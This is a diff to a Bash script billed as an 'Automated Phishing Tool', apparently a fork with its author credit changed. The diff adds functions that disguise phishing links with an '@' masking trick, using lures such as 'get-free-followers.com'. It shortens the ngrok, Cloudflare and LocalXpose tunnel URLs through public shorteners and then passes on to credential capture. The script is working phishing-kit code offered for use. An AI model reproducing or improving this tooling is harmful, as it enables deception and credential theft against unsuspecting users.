@@ -1,9 +1,9 @@
 #!/bin/bash
 
 ##   lxancephisher 	: 	Automated Phishing Tool
-##   Author 	: 	Prince Katiyar
-##   Version 	: 	3.0
-##   Github 	: 	https://github.com/LxaNce-Hacker/lxancephisher
+##   Author 		: 	Prince Katiyar
+##   Version 		: 	3.0
+##   Github 		: 	https://github.com/LxaNce-Hacker/lxancephisher
 
 
 ##                   GNU GENERAL PUBLIC LICENSE
@@ -354,9 +354,9 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}LXANCE-HACKER ${RED}]
+		${GREEN} Author   ${RED}:  ${ORANGE}Prince Katiyar ${RED}[ ${ORANGE}LXANCE-HACKER ${RED}]
 		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/LxaNce-Hacker
-		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
+		${GREEN} Social   ${RED}:  ${CYAN}Coming Soon...
 		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
@@ -465,13 +465,12 @@ start_ngrok() {
 		sleep 2 && ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
 	fi
 
-	{ sleep 8; clear; banner_small; }
+	sleep 8
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
-	ngrok_url1=${ngrok_url#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
+	custom_url "$ngrok_url"
 	capture_data
 }
+
 
 ## Start Cloudflared
 start_cloudflared() { 
@@ -487,12 +486,9 @@ start_cloudflared() {
 		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
 	fi
 
-	{ sleep 8; clear; banner_small; }
-	
-	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
-	cldflr_link1=${cldflr_link#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
+	sleep 8
+	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+	custom_url "$cldflr_url"
 	capture_data
 }
 
@@ -513,13 +509,14 @@ localxpose_auth() {
 	}
 }
 
+
 ## Start LocalXpose (Again...)
 start_loclx() {
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; localxpose_auth; }
 	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
@@ -529,12 +526,12 @@ start_loclx() {
 		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
 	fi
 
-	{ sleep 12; clear; banner_small; }
-	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io') #DONE :)
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}http://$loclx_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$loclx_url"
+	sleep 12
+	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
+	custom_url "$loclx_url"
 	capture_data
 }
+
 
 ## Start localhost
 start_localhost() {
@@ -573,6 +570,65 @@ tunnel_menu() {
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
 	esac
+}
+## Custom Mask URL
+custom_mask() {
+	{ sleep .5; clear; banner_small; echo; }
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
+	echo
+	if [[ ${mask_op,,} == "y" ]]; then
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
+		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
+		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
+			mask=$mask_url
+			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
+		else
+			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
+		fi
+	fi
+}
+
+## URL Shortner
+site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
+
+shorten() {
+	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+	if [[ "$1" == *"shrtco.de"* ]]; then
+		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+	else
+		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
+		processed_url=${short#http*//}
+	fi
+}
+
+custom_url() {
+	url=${1#http*//}
+	isgd="https://www.is.gd/create.php?format=simple&url="
+	shortcode="https://api.shrtco.de/v2/shorten?url="
+	tinyurl="https://tinyurl.com/api-create.php?url="
+
+	{ custom_mask; sleep 1; clear; banner_small; }
+	if [[ ${url} =~ [-a-zA-Z0-9.]*(ngrok.io|trycloudflare.com|loclx.io) ]]; then
+		if [[ $(site_stat $isgd) == 2* ]]; then
+			shorten $isgd "$url"
+		elif [[ $(site_stat $shortcode) == 2* ]]; then
+			shorten $shortcode "$url"
+		else
+			shorten $tinyurl "$url"
+		fi
+
+		url="https://$url"
+		masked_url="$mask@$processed_url"
+		processed_url="https://www.$processed_url"
+	else
+		# echo "[!] No url provided / Regex Not Matched"
+		url="Unable to generate links. Try after turning on hotspot"
+		processed_url="Unable to Short URL"
+	fi
+
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
+	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
 }
 
 ## Facebook
